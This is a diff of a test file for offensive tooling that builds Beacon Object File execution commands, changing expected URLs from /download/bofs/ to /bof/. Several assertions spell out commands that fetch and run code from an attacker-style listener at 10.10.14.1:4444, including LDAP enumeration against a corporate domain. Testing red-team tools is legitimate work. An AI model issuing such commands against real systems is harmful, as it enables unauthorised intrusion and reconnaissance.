@@ -210,7 +210,7 @@ class TestGenerateBofExecutionCommand:
             "ldap_enum",
             "https://10.10.14.1:4444",
         )
-        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/ldap_enum"
+        assert cmd == "bof:https://10.10.14.1:4444/bof/ldap_enum"
 
     def test_bof_with_args_space_separated(self):
         cmd = generate_bof_execution_command(
@@ -218,7 +218,7 @@ class TestGenerateBofExecutionCommand:
             "https://10.10.14.1:4444",
             args=["CORP.local", "dc01.corp.local"],
         )
-        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/ldap_enum CORP.local,dc01.corp.local"
+        assert cmd == "bof:https://10.10.14.1:4444/bof/ldap_enum CORP.local,dc01.corp.local"
 
     def test_bof_command_has_no_colon_between_url_and_args(self):
         cmd = generate_bof_execution_command(
@@ -226,7 +226,7 @@ class TestGenerateBofExecutionCommand:
             "https://10.10.14.1:4444",
             args=[],
         )
-        assert cmd == "bof:https://10.10.14.1:4444/download/bofs/whoami"
+        assert cmd == "bof:https://10.10.14.1:4444/bof/whoami"
         assert cmd.endswith("whoami")
 
     def test_custom_bofs_dir(self):
@@ -239,7 +239,7 @@ class TestGenerateBofExecutionCommand:
 
     def test_empty_args_arg_only_blank_rejected(self):
         cmd = generate_bof_execution_command("whoami", "https://127.0.0.1:4444", args=["", "  "])
-        assert cmd == "bof:https://127.0.0.1:4444/download/bofs/whoami"
+        assert cmd == "bof:https://127.0.0.1:4444/bof/whoami"
 
     def test_rejects_newline_in_bof_name(self):
         with pytest.raises(ValueError):
